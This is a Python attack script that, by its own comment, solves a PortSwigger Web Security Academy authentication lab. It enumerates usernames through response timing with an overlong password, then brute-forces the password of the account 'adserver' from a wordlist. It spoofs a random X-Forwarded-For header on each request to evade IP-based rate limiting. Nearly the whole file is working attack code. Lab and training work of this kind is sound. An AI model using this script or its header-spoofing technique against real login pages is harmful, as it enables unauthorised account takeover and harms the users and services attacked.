#!/usr/bin/python

import time
from multiprocessing import Pool
import requests
import string
import random
# used to solve this lab https://portswigger.net/web-security/authentication/password-based

URL = "https://acc51f861ed6ba6d80b1500700630022.web-security-academy.net/login"

letters = string.ascii_lowercase


def is_valid_payload(params):
    headers = {
        'X-Forwarded-For': ''.join(random.choice(letters) for i in range(6))}
    t0 = time.time()
    requests.post(URL, data=params, headers=headers)
    t1 = time.time()
    delta = (t1 - t0)
    #  time.sleep(10)
    print(params["username"], ": ", delta)


username = "at"
password = ""
threads = []


def brute_usernames(pool):
    with open("usernames") as usernames:
        while True:
            line = usernames.readline()
            line = line[:-1]
            if not line:
                break
            params = {"username": line, "password": "passwordasldkfjasldfja;sldfjalskdfjal;sfj;alsjfdal;ksjdf;alsjdfa;lskfjda;lsdfja;lsdfjaslkfjasldfjasldkfjaslfdj"}
            r = pool.apply_async(is_valid_payload, (params,))
            threads.append(r)
            #  r.get()


def is_valid_pass(params):
    headers = {
        'X-Forwarded-For': ''.join(random.choice(letters) for i in range(6))}
    res = requests.post(URL, data=params, headers=headers)
    if res.text.find("Invalid") == -1:
        print(params["password"])


def brute_passwords(pool):
    with open("passwords") as passwords:
        while True:
            line = passwords.readline()
            line = line[:-1]
            if not line:
                break
            params = {
                "username": "adserver",
                "password": line,
            }
            r = pool.apply_async(is_valid_pass, (params,))
            threads.append(r)


#  brute_users = threading.Thread(target=brute_usernames)
pool = Pool(3)
#  brute_usernames(pool)
brute_passwords(pool)
for thread in threads:
    thread.get()
#  brute_pwd = threading.Thread(target=brute_passwords)
#  brute_users.start()
#  brute_pwd.start()

#  asyncio.run(main())
